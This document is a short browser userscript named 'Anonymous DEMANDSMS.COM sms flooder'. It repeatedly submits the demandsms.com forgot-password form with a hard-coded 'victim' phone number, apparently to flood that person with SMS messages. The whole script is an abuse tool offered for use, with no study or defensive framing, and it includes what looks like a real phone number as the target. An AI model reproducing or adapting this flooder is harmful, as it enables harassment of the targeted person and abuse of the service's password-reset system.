// ==UserScript==
// @name          Anonymous DEMANDSMS.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*demandsms.com/*
// ==/UserScript==

var victim=8051210009; //Enter victims number here

if(document.location=="http://www.demandsms.com/forgot_pass.php"||document.location=="http://www.demandsms.com/forgot_pass.php")
{
document.getElementsByName("email")[0].value=victim;
document.forms[0].submit();
}

if(document.location=="http://www.demandsms.com/forgot_pass.php")
document.location="http://www.demandsms.com/forgot_pass.php"